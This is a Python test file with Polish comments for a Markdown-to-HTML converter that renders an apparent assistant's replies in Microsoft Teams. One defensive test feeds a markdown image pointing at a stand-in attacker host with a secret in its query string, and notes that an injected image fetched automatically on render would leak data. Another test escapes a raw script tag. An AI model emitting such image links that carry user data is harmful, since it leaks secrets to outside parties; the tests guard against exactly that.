"""Testy konwersji Markdown→HTML dla egressu drzwi Teams (delegowany).

Czysta funkcja bez sieci: sprawdzamy render podzbioru renderowanego przez Teams
(pogrubienie, kursywa, nagłówki, listy, kod, link), escapowanie surowych znaków oraz
DEGRADACJĘ do zescapowanego tekstu, gdy biblioteka ``markdown-it-py`` jest niedostępna
(egress nie może wywrócić pollera — ADR 0016).
"""
from __future__ import annotations

import sys

from workmate.adapters.inbound.teams_graph.formatting import to_teams_html


def test_bold_becomes_strong():
    assert "<strong>ważne</strong>" in to_teams_html("**ważne**")


def test_italic_becomes_em():
    assert "<em>ukośnie</em>" in to_teams_html("*ukośnie*")


def test_heading_becomes_h_tag():
    assert "<h3>Status</h3>" in to_teams_html("### Status")


def test_unordered_list_becomes_ul_li():
    html = to_teams_html("- alfa\n- beta")
    assert "<ul>" in html
    assert "<li>alfa</li>" in html
    assert "<li>beta</li>" in html


def test_ordered_list_becomes_ol_li():
    html = to_teams_html("1. pierwszy\n2. drugi")
    assert "<ol>" in html
    assert "<li>pierwszy</li>" in html


def test_inline_code_becomes_code():
    assert "<code>save_note</code>" in to_teams_html("`save_note`")


def test_fenced_code_block_becomes_pre_code():
    html = to_teams_html("```\nx = 1\n```")
    assert "<pre>" in html
    assert "<code>" in html
    assert "x = 1" in html


def test_link_becomes_anchor():
    assert '<a href="https://example.pl">tu</a>' in to_teams_html("[tu](https://example.pl)")


def test_raw_angle_and_amp_are_escaped_not_passed_through():
    html = to_teams_html("1 < 2 & 3")
    assert "&lt;" in html
    assert "&amp;" in html
    assert "< 2" not in html  # nie przepuszczamy surowego znaku jako początku tagu


def test_image_markdown_does_not_become_live_img_tag():
    # Bezpieczeństwo: wstrzyknięty obrazek nie może stać się żywym <img src>, który Teams
    # pobrałby AUTOMATYCZNIE przy renderze (pasywna eksfiltracja). Degraduje do linku/tekstu
    # (klik wymagany — a zwykłe URL-e Teams i tak auto-linkuje, więc link nic nie pogarsza).
    html = to_teams_html("![alt](https://atakujacy.example/pixel.png?d=sekret)")
    assert "<img" not in html
    assert "src=" not in html


def test_empty_string_renders_empty():
    assert to_teams_html("") == ""


def test_falls_back_to_escaped_text_when_library_missing(monkeypatch):
    # Wymuś ImportError na `from markdown_it import ...` (None w sys.modules).
    monkeypatch.setitem(sys.modules, "markdown_it", None)

    result = to_teams_html("**b**\n<script>")

    assert "<strong>" not in result  # brak renderu — biblioteki nie ma
    assert "**b**" in result  # znaczniki Markdown zostają dosłownie
    assert "&lt;script&gt;" in result  # surowy HTML zescapowany
    assert "<br>" in result  # nowa linia zamieniona na <br>
